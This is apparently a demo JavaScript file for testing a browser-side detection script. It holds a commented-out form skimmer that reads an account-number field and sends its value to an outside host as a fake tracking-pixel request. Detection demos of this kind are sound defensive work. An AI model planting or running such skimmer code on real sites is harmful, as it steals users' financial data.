//Example script that you would include in your application
//This could be hosted anywhere on the web
//It would include real functions used by your app.  

//For the purposes of our demo, play the role of the malicious actor, who has
//obtained access to this file, and add function skimaccountnumber
//which sends the secretaccountnumber to a third party site

//Uncomment the following section to "trigger" the alert in the ValidateDomainsRequestedByBrowser automation script

/* START OF SECTION - REMOVE THIS OPEN COMMENT
document.getElementById("secretaccountnumber").onchange= function(  ){skimaccountnumber()};

function skimaccountnumber()
{

if ( document.getElementsByName('secretaccountnumber')[0].value.length >0 ) {
    var xhr = new XMLHttpRequest();
    url='https://articles.hotelexistence.ca/trackingpixel.png?secretaccountnumber=' + document.getElementsByName('secretaccountnumber')[0].value
    xhr.open('GET', url, true);

    xhr.onload = function () {
    // Request finished. Do processing here.
    };

    xhr.send(null);
    }

}

*/ //END OF SECTION - REMOVE THIS CLOSE COMMENT